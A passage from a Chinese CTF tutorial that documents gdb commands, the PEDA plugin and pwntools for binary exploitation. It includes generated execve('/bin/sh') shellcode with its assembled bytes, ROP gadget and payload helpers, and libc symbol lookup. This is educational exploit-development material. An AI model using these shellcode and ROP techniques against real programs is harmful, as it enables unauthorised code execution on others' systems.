s\n\n单步执行程序，直到到达不同的源码行。\n\n- `step [N]` 参数 `N` 表示执行 N 次（或由于另一个原因直到程序停止）。\n\n#### reverse-step\n\n反向步进程序，直到到达另一个源码行的开头。\n\n- `reverse-step [N]` 参数 `N` 表示执行 N 次（或由于另一个原因直到程序停止）。\n\n#### next -- n\n\n单步执行程序，执行完子程序调用。\n\n- `next [N]`与 `step` 不同，如果当前的源代码行调用子程序，则此命令不会进入子程序，而是继续执行，将其视为单个源代码行。\n\n#### reverse-next\n\n反向步进程序，执行完子程序调用。\n\n- `reverse-next [N]`\n\n如果要执行的源代码行调用子程序，则此命令不会进入子程序，调用被视为一个指令。\n\n#### return\n\n您可以使用 `return` 命令取消函数调用的执行。如果你给出一个表达式参数，它的值被用作函数的返回值。\n\n- `return <expression>` 将 `expression` 的值作为函数的返回值并使函数直接返回。\n\n#### finish -- fin\n\n执行直到选定的栈帧返回。\n\n- `finish`\n\n#### until -- u\n\n执行程序直到大于当前栈帧或当前栈帧中的指定位置（与 `break` 命令相同的参数）的源码行。此命令常用于通过一个循环，以避免单步执行。\n\n- `until <location>` 继续运行程序，直到达到指定的位置，或者当前栈帧返回。\n\n#### continue -- c\n\n在信号或断点之后，继续运行被调试的程序。\n\n- `continue [N]`\n\n如果从断点开始，可以使用数字 `N` 作为参数，这意味着将该断点的忽略计数设置为 `N - 1`(以便断点在第 N 次到达之前不会中断)。\n\n#### print -- p\n\n求表达式 expr 的值并打印。可访问的变量是所选栈帧的词法环境，以及范围为全局或整个文件的所有变量。\n\n- `print [expr]`\n- `print /f [expr]` 通过指定 `/f` 来选择不同的打印格式，其中 `f` 是一个指定格式的字母\n\n#### x\n\n检查内存。\n\n- `x/nfu <addr>`\n- `x <addr>`\n  - `n`, `f`, 和 `u` 都是可选参数，用于指定要显示的内存以及如何格式化。\n  - `addr` 是要开始显示内存的地址的表达式。\n  - `n` 重复次数（默认值是 1），指定要显示多少个单位（由 `u` 指定）的内存值。\n  - `f` 显示格式（初始默认值是 `x`），显示格式是 `print('x'，'d'，'u'，'o'，'t'，'a'，'c'，'f'，'s')` 使用的格式之一，再加 `i`（机器指令）。\n  - `u` 单位大小，`b` 表示单字节，`h` 表示双字节，`w` 表示四字节，`g` 表示八字节。\n\n#### display\n\n每次程序停止时打印表达式 expr 的值。\n\n- `display <expr>`\n- `display/fmt <expr>`\n- `display/fmt <addr>`\n\n`fmt` 用于指定显示格式。对于格式 `i` 或 `s`，或者包括单位大小或单位数量，将表达式 `addr` 添加为每次程序停止时要检查的内存地址。\n\n#### disassemble -- disas\n\n反汇编命令。\n\n- `disas <func>` 反汇编指定函数\n- `disas <addr>` 反汇编某地址所在函数\n- `disas <begin_addr> <end_addr>` 反汇编从开始地址到结束地址的部分\n\n#### undisplay\n\n取消某些表达式在程序停止时自动显示。参数是表达式的编号（使用 `info display`查询编号）。不带参数表示取消所有自动显示表达式。\n\n#### disable display\n\n禁用某些表达式在程序停止时自动显示。禁用的显示项目被再次启用。参数是表达式的编号（使用 `info display` 查询编号）。不带参数表示禁用所有自动显示表达式。\n\n#### enable display\n\n启用某些表达式在程序停止时自动显示。参数是重新显示的表达式的编号（使用 `info display` 查询编号）。不带参数表示启用所有自动显示表达式。\n\n#### help -- h\n\n打印命令列表。\n\n- `help <class>` 您可以获取该类中各个命令的列表。\n- `help <command>` 显示如何使用该命令的简述。\n\n#### attach\n\n挂接到 GDB 之外的进程或文件。将进程 ID 或设备文件作为参数。\n\n- `attach <process-id>`\n\n#### run -- r\n\n启动被调试的程序。可以直接指定参数，也可以用 `set args` 设置（启动所需的）参数。还允许使用 `>`, `<`, 或 `>>` 进行输入和输出重定向。\n\n甚至可以运行一个脚本，如：\n\n```text\nrun `python2 -c 'print \"A\"*100'`\n```\n\n#### backtrace -- bt\n\n打印整个栈的回溯。\n\n- `bt` 打印整个栈的回溯，每个栈帧一行。\n- `bt n` 类似于上，但只打印最内层的 n 个栈帧。\n- `bt -n` 类似于上，但只打印最外层的 n 个栈帧。\n- `bt full n` 类似于 `bt n`，还打印局部变量的值。\n\n> 注意：使用 gdb 调试时，会自动关闭 ASLR，所以可能每次看到的栈地址都不变。\n\n#### ptype\n\n打印类型 TYPE 的定义。\n\n- `ptype[/FLAGS] TYPE-NAME | EXPRESSION`\n\n参数可以是由 `typedef` 定义的类型名， 或者 `struct STRUCT-TAG` 或者 `class CLASS-NAME` 或者 `union UNION-TAG` 或者 `enum ENUM-TAG`。\n\n#### set follow-fork-mode\n\n当程序 fork 出一个子进程的时候，gdb 默认会追踪父进程（`set follow-fork-mode parent`），但也可以使用命令 `set follow-fork-mode child` 让其追踪子进程。\n\n另外，如果想要同时追踪父进程和子进程，可以使用命令 `set detach-on-fork off`（默认为`on`），这样就可以同时调试父子进程，在调试其中一个进程时，另一个进程被挂起。如果想让父子进程同时运行，可以使用 `set schedule-multiple on`（默认为`off`）。\n\n但如果程序是使用 exec 来启动了一个新的程序，可以使用 `set follow-exec-mode new`（默认为`same`） 来新建一个 inferior 给新程序，而父进程的 inferior 仍然保留。\n\n#### thread apply all bt\n\n打印出所有线程的堆栈信息。\n\n#### generate-core-file\n\n将调试中的进程生成内核转储文件。\n\n#### directory -- dir\n\n设置查找源文件的路径。\n\n或者使用 gdb 的 `-d` 参数，例如：`gdb a.out -d /search/code/`\n\n### 0x24 gdb-peda (gdb-gef)\n\n当 gdb 启动时，它会在当前用户的主目录中寻找一个名为 `.gdbinit` 的文件；如果该文件存在，则 gdb 就执行该文件中的所有命令。通常，该文件用于简单的配置命令。但是 `.gdbinit` 的配置十分繁琐，因此对 gdb 的扩展通常用插件的方式来实现，通过 python 的脚本可以很方便的实现需要的功能。\n\nPEDA（Python Exploit Development Assistance for GDB）是一个强大的 gdb 插件。它提供了高亮显示反汇编代码、寄存器、内存信息等人性化的功能。同时，PEDA 还有一些实用的新命令，比如 checksec 可以查看程序开启了哪些安全机制等等。\n\n#### 安装\n\n安装 peda 需要的软件包：\n\n```shell\n$ sudo apt-get install nasm micro-inetd\n$ sudo apt-get install libc6-dbg vim ssh\n```\n\n安装 peda：\n\n```shell\n$ git clone https://github.com/longld/peda.git ~/peda\n$ echo \"source ~/peda/peda.py\" >> ~/.gdbinit\n$ echo \"DONE! debug your program with gdb and enjoy\"\n```\n\n如果系统为 Arch Linux，则可以直接安装：\n\n```shell\n$ yaourt -S peda\n```\n\n#### peda命令\n\n##### aslr\n\n> 显示/设置 gdb 的 ASLR\n\n##### asmsearch\n\n> Search for ASM instructions in memory \n\n- `asmsearch \"int 0x80\"`\n- `asmsearch \"add esp, ?\" libc`\n##### assemble\n> On the fly assemble and execute instructions using NASM\n\n```text\nassemble $pc\n> mov al, 0xb\n> int 0x80\n> end\n```\n\n##### checksec\n\n- 检查二进制文件的安全选项\n\n##### cmpmem\n\n- Compare content of a memory region with a file\n- `cmpmem 0x08049000 0x0804a000 data.mem`\n\n##### context\n\n- Display various information of current execution context\n- `context_code` -- Display nearby disassembly at $PC of current execution context\n- `context_register` -- Display register information of current execution context\n- `context_stack`- - Display stack of current execution context\n- `context reg`  \n- `context code` \n- `context stack`\n\n##### crashdump \n\n- Display crashdump info and save to file\n\n##### deactive\n\n- Bypass a function by ignoring its execution (eg sleep/alarm)\n- `deactive setresuid`\n- `deactive chdir`\n\n##### distance\n\n- Calculate distance between two addresses\n\n##### dumpargs\n\n- 在调用指令停止时显示传递给函数的参数\n\n##### dumpmem\n\n- Dump content of a memory region to raw binary file\n-`dumpmem libc.mem libc`\n\n##### dumprop\n\n- 在特定的内存范围显示 ROP gadgets\n- `dumprop binary \"pop\"`\n\n##### eflags\n\n- Display/set/clear/toggle value of eflags register\n- `elfheader`\n  - 获取正在调试的 ELF 文件的头信息\n  - `elfheader` \n- `elfheader .got`\n  \n##### elfsymbol\n\n- 从 ELF 文件中获取没有调试信息的符号信息\n- `elfsymbol`\n- `elfsymbol printfgennop`\n\n##### gennop\n\n- Generate abitrary length NOP sled using given characters\n- `gennop 500`\n- `gennop 500 \"\\x90\"`\n  \n##### getfile\n\n- Get exec filename of current debugged process\n\n##### getpid\n\n- Get PID of current debugged process\n\n##### goto\n\n- Continue execution at an address\n\n##### help\n\n- Print the usage manual for PEDA commands\n\n##### hexdump\n\n- Display hex/ascii dump of data in memory\n- `hexdump $sp 64`\n- `hexdump $sp /20`\n\n##### hexprint\n\n- Display hexified of data in memory\n- `hexprint $sp 64`\n- `hexprint $sp /20`\n  \n##### jmpcall\n\n- Search for JMP/CALL instructions in memory\n- `jmpcall eax`\n- `jmpcall esp libc`\n  \n##### loadmem\n\n- Load contents of a raw binary file to memory\n- `loadmem stack.mem 0xbffdf000`\n\n##### lookup\n\n- 搜索属于内存范围的地址的所有地址/引用\n- `lookup address stack libc`\n- `lookup pointer stack ld-2`\n  \n##### nearpc\n\n- Disassemble instructions nearby current PC or given address\n- `nearpc 20`\n- `nearpc 0x08048484`\n  \n##### nextcall\n\n- Step until next 'call' instruction in specific memory range\n- `nextcall cpy`\n\n##### nextjmp\n\n- Step until next 'j*' instruction in specific memory range\n- `nextjmp`\n\n##### nxtest\n\n-- Perform real NX test to see if it is enabled/supported by OS\n\n##### patch\n\n- 使用字符串/十六进制字符串/整形数\n- `patch $esp 0xdeadbeef`\n- `patch $eax \"the long string\"`\n- `patch (multiple lines)`\n  \n##### pattern\n\n- 生成，搜索或写入循环 pattern 到内存\n- `pattern_arg` -- Set argument list with cyclic pattern\n- `pattern_create` -- Generate a cyclic pattern\n- `pattern_env` -- Set environment variable with a cyclic patter\n- `pattern_offset` -- Search for offset of a value in cyclic pattern\n- `pattern_patch` -- Write a cyclic pattern to memory\n- `pattern_search` -- Search a cyclic pattern in registers and memory\n- `pattern create 2000`\n- `pattern create 2000 input`\n- `pattern offset $pc`\n- `pattern search`\n- `pattern patch 0xdeadbeef 100`\n  \n##### payload\n\n- Generate various type of ROP payload using ret2plt\n- `payload copybytes`\n- `payload copybytes target \"/bin/sh\"`\n- `payload copybytes 0x0804a010 offset`\n  \n##### pdisass\n\n- Format output of gdb disassemble command with colors\n- `pdisass $pc /20`\n\n##### pltbreak\n\n- Set breakpoint at PLT functions match name regex\n- `pltbreak cpy`\n\n##### procinfo\n\n- 显示调试进程的 /proc/pid/\n- `procinfo`\n- `procinfo fd`\n  \n##### profile\n\n- Simple profiling to count executed instructions in the program\n\n##### pyhelp\n\n- Wrapper for python built-in help\n- `pyhelp peda`\n- `pyhelp hex2str`\n  \n##### pshow\n\n- 显示各种 PEDA 选项和其他设置\n- `pshow`\n- `pshow option context`\n  \n##### pset\n\n- 设置各种 PEDA 选项和其他设置\n- `pset arg '\"A\"*200'`\n- `pset arg 'cyclic_pattern(200)'`\n  - `pset env EGG 'cyclic_pattern(200)'`\n  - `pset option context \"code,stack\"`\n  - `pset option badchars \"\\r\\n\"`\n  \n##### readelf\n\n- 获取 ELF 的文件头信息\n- `readelf libc .text`\n\n##### refsearch\n\n- Search for all references to a value in memory ranges\n- `refsearch \"/bin/sh\"`\n- `refsearch 0xdeadbeef`\n  \n##### reload \n\n- Reload PEDA sources, keep current options untouch\n\n##### ropgadget\n\n- 获取二进制或库的常见 ROP gadgets\n- `ropgadget`\n- `ropgadget libc`\n  \n##### ropsearch\n\n- 搜索内存中的 ROP gadgets\n- `ropsearch \"pop eax\"`\n- `ropsearch \"xchg eax, esp\" libc`\n  \n##### searchmem|find\n\n- 搜索内存中的 pattern, 支持正则表达式搜索\n- `find \"/bin/sh\" libc`\n- `find 0xdeadbeef all`\n- `find \"..\\x04\\x08\" 0x08048000 0x08049000`\n- `searchmem` -- Search for a pattern in memory; support regex search\n- `session` -- Save/restore a working gdb session to file as a script\n\n##### set\n\n- Set various PEDA options and other settings\n- `set exec-wrapper ./exploit.py`\n\n##### sgrep\n\n- Search for full strings contain the given pattern\n\n##### shellcode\n\n- 生成或下载常见的 shellcode\n- `shellcode x86/linux exec`\n\n##### show\n\n- Show various PEDA options and other settings\n\n##### skeleton\n  - 生成 python exploit 代码模板\n  - `skeleton argv exploit.py`\n\n##### skipi\n\n- Skip execution of next count instructions\n\n##### snapshot\n\n- Save/restore process's snapshot to/from file\n- `snapshot save`\n- `snapshot restore`\n  \n##### start\n\n- Start debugged program and stop at most convenient entry\n\n##### stepuntil\n\n- Step until a desired instruction in specific memory range\n- `stepuntil cmp`\n- `stepuntil xor`\n  \n##### strings\n\n- Display printable strings in memory\n- `strings`\n- `strings binary 4`\n  \n##### substr\n\n- Search for substrings of a given string/number in memory\n\n##### telescope\n\n- Display memory content at an address with smart dereferences\n- `telescope 40`\n- `telescope 0xb7d88000 40`\n  \n##### tracecall\n\n- Trace function calls made by the program\n- `tracecall`\n- `tracecall \"cpy,printf\"`\n- `tracecall \"-puts,fflush\"`\n  \n##### traceinst\n\n- Trace specific instructions executed by the program\n- `traceinst 20`\n- `traceinst \"cmp,xor\"`\n  \n##### unptrace\n\n- Disable anti-ptrace detection\n- `unptrace`\n\n##### utils\n\n- Miscelaneous utilities from utils module\n\n##### vmmap\n\n- 在调试过程中获取段的虚拟映射地址范围\n- `cmmap`\n- `vmmap binary / libc`\n  - `vmmap 0xb7d88000`\n  \n##### waitfor\n\n- Try to attach to new forked process; mimic \"attach -waitfor\"\n- `waitfor`  \n- `waitfor myprog -c`\n  \n##### xinfo\n\n- Display detail information of address/registers\n- `xinfo register eax`\n- `xinfo 0xb7d88000`\n  \n##### xormem\n\n- 用一个 key 来对一个内存区域执行 XOR 操作\n- `xormem 0x08049000 0x0804a000 “thekey”`\n\n##### xprint\n\n- Extra support to GDB's print command\n\n##### xrefs\n\n- Search for all call/data access references to a function/variable\n\n##### xuntil\n\n- Continue execution until an address or function\n\n#### 使用 PEDA 和 Python 编写 gdb 脚本\n\n#####   pedacmd\n\n```\n- 交互式命令\n```\n- 没有返回值\n  - 例如：`pedacmd.context_register()`\n    \n  ##### peda\n  \n  ```\n  - 与 gdb 交互的后端功能\n  ```\n- 有返回值\n  - 例如：`peda.getreg(\"eax\")`\n  \n##### 小工具\n\n  - 例如：`to_int()`、`format_address()`\n  - 获得帮助\n    - `pyhelp peda`\n    - `pyhelp hex2str`\n\n##### 单行／交互式使用\n\n- `gdb-peda$ python print peda.get_vmmap()`\n\n ```text\n gdb-peda$ python\n > status = peda.get_status()\n > while status == \"BREAKPOINT\":\n >    peda.execute(\"continue\")\n > end\n ```\n\n##### 外部脚本\n\n```text\n# myscript.py\ndef myrun(size):\nargv = cyclic_pattern(size)\npeda.execute(\"set arg %s\" % argv)\npeda.execute(\"run\")\n```\n\n```text\ngdb-peda$ source myscript.py\ngdb-peda$ python myrun(100)\n```\n\n## 0x30 pwntools\n\n### 0x31 安装\n\n1. 安装binutils：\n\n   ```shell\n   git clone https://github.com/Gallopsled/pwntools-binutils\n   sudo apt-get install software-properties-common\n   sudo apt-add-repository ppa:pwntools/binutils\n   sudo apt-get update\n   sudo apt-get install binutils-arm-linux-gnu\n   ```\n\n2. 安装capstone：\n\n   ```shell\n   git clone https://github.com/aquynh/capstone\n   cd capstone\n   make\n   sudo make install\n   ```\n\n3. 安装pwntools:\n\n   ```shell\n   sudo apt-get install libssl-dev\n   sudo pip install pwntools\n   ```\n\n如果你在使用 Arch Linux，则可以通过 AUR 直接安装，这个包目前是由我维护的，如果有什么问题，欢迎与我交流：\n\n```text\n$ yaourt -S python2-pwntools\n或者\n$ yaourt -S python2-pwntools-git\n```\n\n但是由于 Arch 没有 PPA 源，如果想要支持更多的体系结构（如 arm, aarch64 等），只能手动编译安装相应的 binutils，使用下面的脚本，注意将变量 `V` 和 `ARCH` 换成你需要的。[binutils](https://ftp.gnu.org/gnu/binutils/)[源码](https://firmianay.gitbooks.io/ctf-all-in-one/content/src/others/2.4.1_pwntools/binutils.sh)\n\n```bash\n#!/usr/bin/env bash\n\nV = 2.29   # binutils version\nARCH = arm # target architecture\n\ncd /tmp\nwget -nc https://ftp.gnu.org/gnu/binutils/binutils-$V.tar.xz\nwget -nc https://ftp.gnu.org/gnu/binutils/binutils-$V.tar.xz.sig\n\n# gpg --keyserver keys.gnupg.net --recv-keys C3126D3B4AE55E93\n# gpg --verify binutils-$V.tar.xz.sig\n\ntar xf binutils-$V.tar.xz\n\nmkdir binutils-build\ncd binutils-build\n\nexport AR=ar\nexport AS=as\n\n../binutils-$V/configure \\\n    --prefix=/usr/local \\\n    --target=$ARCH-unknown-linux-gnu \\\n    --disable-static \\\n    --disable-multilib \\\n    --disable-werror \\\n    --disable-nls\n\nmake\nsudo make install\n```\n\n测试安装是否成功：\n\n```python\n>>> from pwn import *\n>>> asm('nop')\n'\\x90'\n>>> asm('nop', arch='arm')\n'\\x00\\xf0 \\xe3'\n```\n\n### 0x32 模块简介\n\nPwntools 分为两个模块，一个是 `pwn`，简单地使用 `from pwn import *` 即可将所有子模块和一些常用的系统库导入到当前命名空间中，是专门针对 CTF 比赛的；而另一个模块是 `pwnlib`，它更推荐你仅仅导入需要的子模块，常用于基于 pwntools 的开发。\n\n下面是 pwnlib 的一些子模块（常用模块和函数加粗显示）：\n\n- `adb`：安卓调试桥\n- `args`：命令行魔法参数\n- **asm**：汇编和反汇编，支持 i386/i686/amd64/thumb 等\n- `constants`：对不同架构和操作系统的常量的快速访问\n- `config`：配置文件\n- `context`：设置运行时变量\n- **dynelf**：用于远程函数泄露\n- `encoders`：对 shellcode 进行编码\n- **elf**：用于操作 ELF 可执行文件和库\n- `flag`：提交 flag 到服务器\n- **fmtstr**：格式化字符串利用工具\n- **gdb**：与 gdb 配合使用\n- `libcdb`：libc 数据库\n- `log`：日志记录\n- **memleak**：用于内存泄露\n- **rop**：ROP 利用模块，包括 rop 和 srop\n- `runner`：运行 shellcode\n- **shellcraft**：shellcode 生成器: `system('/bin/sh')`\n- `term`：终端处理\n- `timeout`：超时处理\n- **tubes**：能与 sockets, processes, ssh 等进行连接\n- `ui`：与用户交互\n- `useragents`：useragent 字符串数据库\n- **util**：一些实用小工具\n\n### 0x33 使用 Pwntools\n\n下面我们对常用模块和函数做详细的介绍。\n\n#### tubes\n\n在一次漏洞利用中，首先当然要与二进制文件或者目标服务器进行交互，这就要用到 tubes 模块。\n\n主要函数在 `pwnlib.tubes.tube` 中实现，子模块只实现某管道特殊的地方。四种管道和相对应的子模块如下：\n\n- pwnlib.tubes.process：进程\n  - `>>> p = process('/bin/sh')`\n- `pwnlib.tubes.serialtube`：串口\n- ·pwnlib.tubes.sock·：套接字\n  - `>>> r = remote('127.0.0.1', 1080)`\n  - `>>> l = listen(1080)`\n- `pwnlib.tubes.ssh`：SSH\n  - `>>> s = ssh(host='example.com`, user='name', password='passwd')`\n- `pwnlib.tubes.tube` 中的主要函数：\n  - `interactive()`：可同时读写管道，相当于回到 shell 模式进行交互，在取得 shell 之后调用\n  - `recv(numb=1096, timeout=default)`：接收指定字节数的数据\n  - `recvall()`：接收数据直到 EOF\n  - `recvline(keepends=True)`：接收一行，可选择是否保留行尾的 `\\n`\n  - `recvrepeat(timeout=default)`：接收数据直到 EOF 或 timeout\n  - `recvuntil(delims, timeout=default)`：接收数据直到 delims 出现\n  - `send(data)`：发送数据\n  - `sendline(data)`：发送一行，默认在行尾加 `\\n`\n  - `close()`：关闭管道\n\n下面是一个例子，先使用 listen 开启一个本地的监听端口，然后使用 remote 开启一个套接字管道与之交互：\n\n```text\n>>> from pwn import *\n>>> l = listen()\n[x] Trying to bind to 0.0.0.0 on port 0\n[x] Trying to bind to 0.0.0.0 on port 0: Trying 0.0.0.0\n[+] Trying to bind to 0.0.0.0 on port 0: Done\n[x] Waiting for connections on 0.0.0.0:46147\n>>> r = remote('localhost', l.lport)\n[x] Opening connection to localhost on port 46147\n[x] Opening connection to localhost on port 46147: Trying ::1\n[x] Opening connection to localhost on port 46147: Trying 127.0.0.1\n[+] Opening connection to localhost on port 46147: Done\n>>> [+] Waiting for connections on 0.0.0.0:46147: Got connection from 127.0.0.1 on port 38684\n\n>>> c = l.wait_for_connection()\n>>> r.send('hello\\n')\n>>> c.recv()\n'hello\\n'\n>>> r.send('hello\\n')\n>>> c.recvline()\n'hello\\n'\n>>> r.sendline('hello')\n>>> c.recv()\n'hello\\n'\n>>> r.sendline('hello')\n>>> c.recvline()\n'hello\\n'\n>>> r.sendline('hello')\n>>> c.recvline(keepends=False)\n'hello'\n>>> r.send('hello world')\n>>> c.recvuntil('hello')\n'hello'\n>>> c.recv()\n' world'\n>>> c.close()\n[*] Closed connection to 127.0.0.1 port 38684\n>>> r.close()\n[*] Closed connection to localhost port 46147\n```\n\n下面是一个与进程交互的例子：\n\n```text\n>>> p = process('/bin/sh')\n[x] Starting local process '/bin/sh'\n[+] Starting local process '/bin/sh': pid 26481\n>>> p.sendline('sleep 3; echo hello world;')\n>>> p.recvline(timeout=1)\n'hello world\\n'\n>>> p.sendline('sleep 3; echo hello world;')\n>>> p.recvline(timeout=1)\n''\n>>> p.recvline(timeout=5)\n'hello world\\n'\n>>> p.interactive()\n[*] Switching to interactive mode\nwhoami\nfirmy\n^C[*] Interrupted\n>>> p.close()\n[*] Stopped process '/bin/sh' (pid 26481)\n```\n\n#### shellcraft\n\n使用 shellcraft 模块可以生成对应架构和 shellcode 代码，直接使用链式调用的方法就可以得到，首先指定体系结构，再指定操作系统：\n\n```text\n>>> print shellcraft.i386.nop().strip('\\n')\n    nop\n>>> print shellcraft.i386.linux.sh()\n    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push '/bin///sh\\x00' */\n    push 0x68\n    push 0x732f2f2f\n    push 0x6e69622f\n    mov ebx, esp\n    /* push argument array ['sh\\x00'] */\n    /* push 'sh\\x00\\x00' */\n    push 0x1010101\n    xor dword ptr [esp], 0x1016972\n    xor ecx, ecx\n    push ecx /* null terminate */\n    push 4\n    pop ecx\n    add ecx, esp\n    push ecx /* 'sh\\x00' */\n    mov ecx, esp\n    xor edx, edx\n    /* call execve() */\n    push SYS_execve /* 0xb */\n    pop eax\n    int 0x80\n    \n    shellcraft.sh()\n```\n\n#### asm\n\n该模块用于汇编和反汇编代码。\n\n体系结构，端序和字长需要在 `asm()` 和 `disasm()` 中设置，但为了避免重复，运行时变量最好使用 `pwnlib.context` 来设置。\n\n汇编：(`pwnlib.asm.asm`)\n\n```assembly\n>>> asm('nop')\n'\\x90'\n>>> asm(shellcraft.nop())\n'\\x90'\n>>> asm('nop', arch='arm')\n'\\x00\\xf0 \\xe3'\n>>> context.arch = 'arm'\n>>> context.os = 'linux'\n>>> context.endian = 'little'\n>>> context.word_size = 32\n>>> context\nContextType(arch = 'arm', bits = 32, endian = 'little', os = 'linux')\n>>> asm('nop')\n'\\x00\\xf0 \\xe3'\n>>> asm('mov eax, 1')\n'\\xb8\\x01\\x00\\x00\\x00'\n>>> asm('mov eax, 1').encode('hex')\n'b801000000'\n```\n\n请注意，这里我们生成了 i386 和 arm 两种不同体系结构的 `nop`，当你使用不同与本机平台的汇编时，需要安装该平台的 binutils，方法在上面已经介绍过了。\n\n反汇编：(`pwnlib.asm.disasm`)\n\n```text\n>>> print disasm('\\xb8\\x01\\x00\\x00\\x00')\n   0:   b8 01 00 00 00          mov    eax,0x1\n>>> print disasm('6a0258cd80ebf9'.decode('hex'))\n   0:   6a 02                   push   0x2\n   2:   58                      pop    eax\n   3:   cd 80                   int    0x80\n   5:   eb f9                   jmp    0x0\n```\n\n构建具有指定二进制数据的 ELF 文件：(`pwnlib.asm.make_elf`)\n\n```text\n>>> context.clear(arch='amd64')\n>>> context\nContextType(arch = 'amd64', bits = 64, endian = 'little')\n>>> bin_sh = asm(shellcraft.amd64.linux.sh())\n>>> bin_sh\n'jhH\\xb8/bin///sPH\\x89\\xe7hri\\x01\\x01\\x814$\\x01\\x01\\x01\\x011\\xf6Vj\\x08^H\\x01\\xe6VH\\x89\\xe61\\xd2j;X\\x0f\\x05'\n>>> filename = make_elf(bin_sh, extract=False)\n>>> filename\n'/tmp/pwn-asm-V4GWGN/step3-elf'\n>>> p = process(filename)\n[x] Starting local process '/tmp/pwn-asm-V4GWGN/step3-elf'\n[+] Starting local process '/tmp/pwn-asm-V4GWGN/step3-elf': pid 28323\n>>> p.sendline('echo hello')\n>>> p.recv()\n'hello\\n'\n```\n\n这里我们生成了 amd64，即 64 位 `/bin/sh` 的 shellcode，配合上 asm 函数，即可通过 `make_elf` 得到 ELF 文件。\n\n另一个函数 `pwnlib.asm.make_elf_from_assembly` 允许你构建具有指定汇编代码的 ELF 文件：\n\n```text\n>>> asm_sh = shellcraft.amd64.linux.sh()\n>>> print asm_sh\n    /* execve(path='/bin///sh', argv=['sh'], envp=0) */\n    /* push '/bin///sh\\x00' */\n    push 0x68\n    mov rax, 0x732f2f2f6e69622f\n    push rax\n    mov rdi, rsp\n    /* push argument array ['sh\\x00'] */\n    /* push 'sh\\x00' */\n    push 0x1010101 ^ 0x6873\n    xor dword ptr [rsp], 0x1010101\n    xor esi, esi /* 0 */\n    push rsi /* null terminate */\n    push 8\n    pop rsi\n    add rsi, rsp\n    push rsi /* 'sh\\x00' */\n    mov rsi, rsp\n    xor edx, edx /* 0 */\n    /* call execve() */\n    push SYS_execve /* 0x3b */\n    pop rax\n    syscall\n\n>>> filename = make_elf_from_assembly(asm_sh)\n>>> filename\n'/tmp/pwn-asm-ApZ4_p/step3'\n>>> p = process(filename)\n[x] Starting local process '/tmp/pwn-asm-ApZ4_p/step3'\n[+] Starting local process '/tmp/pwn-asm-ApZ4_p/step3': pid 28429\n>>> p.sendline('echo hello')\n>>> p.recv()\n'hello\\n'\n```\n\n与上一个函数不同的是，`make_elf_from_assembly` 直接从汇编生成 ELF 文件，并且保留了所有的符号，例如标签和局部变量等。\n\n#### elf\n\n该模块用于 ELF 二进制文件的操作，包括符号查找、虚拟内存、文件偏移，以及修改和保存二进制文件等功能。(`pwnlib.elf.elf.ELF`)\n\n```text\n>>> e = ELF('/bin/cat')\n[*] '/bin/cat'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n>>> print hex(e.address)\n0x400000\n>>> print hex(e.symbols['write'])\n0x401680\n>>> print hex(e.got['write'])\n0x60b070\n>>> print hex(e.plt['write'])\n0x401680\n```\n\n上面的代码分别获得了 ELF 文件装载的基地址、函数地址、GOT 表地址和 PLT 表地址。\n\n我们常常用它打开一个 libc.so，从而得到 system 函数的位置，这在 CTF 中是非常有用的：\n\n```text\n>>> e = ELF('/usr/lib/libc.so.6')\n[*] '/usr/lib/libc.so.6'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n>>> print hex(e.symbols['system'])\n0x42010\n```\n\n我们甚至可以修改 ELF 文件的代码：\n\n```text\n>>> e = ELF('/bin/cat')\n>>> e.read(e.address+1, 3)\n'ELF'\n>>> e.asm(e.address, 'ret')\n>>> e.save('/tmp/quiet-cat')\n>>> disasm(file('/tmp/quiet-cat','rb').read(1))\n'   0:   c3                      ret'\n```\n\n下面是一些常用函数：\n\n- `asm(address, assembly)`：汇编指定指令并插入到 ELF 的指定地址处，需要使用 ELF.save() 保存\n- `bss(offset)`：返回 `.bss` 段加上 `offset` 后的地址\n- `checksec()`：打印出文件使用的安全保护\n- `disable_nx()`：关闭 NX\n- `disasm(address, n_bytes)`：返回对指定虚拟地址进行反汇编后的字符串\n- `offset_to_vaddr(offset)`：将指定偏移转换为虚拟地址\n- `vaddr_to_offset(address)`：将指定虚拟地址转换为文件偏移\n- `read(address, count)`：从指定虚拟地址读取 `count` 个字节的数据\n- `write(address, data)`：在指定虚拟地址处写入 `data`\n- `section(name)`：获取 `name` 段的数据\n- `debug()`：使用 `gdb.debug()` 进行调试\n\n最后还要注意一下 `pwnlib.elf.corefile`，它用于处理核心转储文件（Core Dump），当我们在写利用代码时，核心转储文件是非常有用的，关于它更详细的内容已经在前面 Linux基础一章中讲过，这里我们还是使用那一章中的示例代码，但使用 pwntools 来操作。\n\n```text\n>>> core = Corefile('/tmp/core-a.out-30555-1507796886')\n[x] Parsing corefile...\n[*] '/tmp/core-a.out-30555-1507796886'\n    Arch:      i386-32-little\n    EIP:       0x565cd57b\n    ESP:       0x4141413d\n    Exe:       '/home/firmy/a.out' (0x565cd000)\n    Fault:     0x4141413d\n[+] Parsing corefile...: Done\n>>> core.registers\n{'xds': 43, 'eip': 1448924539, 'xss': 43, 'esp': 1094795581, 'xgs': 99, 'edi': 0, 'orig_eax': 4294967295, 'xcs': 35, 'eax': 1, 'ebp': 1094795585, 'xes': 43, 'eflags': 66182, 'edx': 4151195744, 'ebx': 1094795585, 'xfs': 0, 'esi': 4151189032, 'ecx': 1094795585}\n>>> print core.maps\n565cd000-565ce000 r-xp 1000 /home/firmy/a.out\n565ce000-565cf000 r--p 1000 /home/firmy/a.out\n565cf000-565d0000 rw-p 1000 /home/firmy/a.out\n57b3c000-57b5e000 rw-p 22000\nf7510000-f76df000 r-xp 1cf000 /usr/lib32/libc-2.26.so\nf76df000-f76e0000 ---p 1000 /usr/lib32/libc-2.26.so\nf76e0000-f76e2000 r--p 2000 /usr/lib32/libc-2.26.so\nf76e2000-f76e3000 rw-p 1000 /usr/lib32/libc-2.26.so\nf76e3000-f76e6000 rw-p 3000\nf7722000-f7724000 rw-p 2000\nf7724000-f7726000 r--p 2000 [vvar]\nf7726000-f7728000 r-xp 2000 [vdso]\nf7728000-f774d000 r-xp 25000 /usr/lib32/ld-2.26.so\nf774d000-f774e000 r--p 1000 /usr/lib32/ld-2.26.so\nf774e000-f774f000 rw-p 1000 /usr/lib32/ld-2.26.so\nffe37000-ffe58000 rw-p 21000 [stack]\n>>> print hex(core.fault_addr)\n0x4141413d\n>>> print 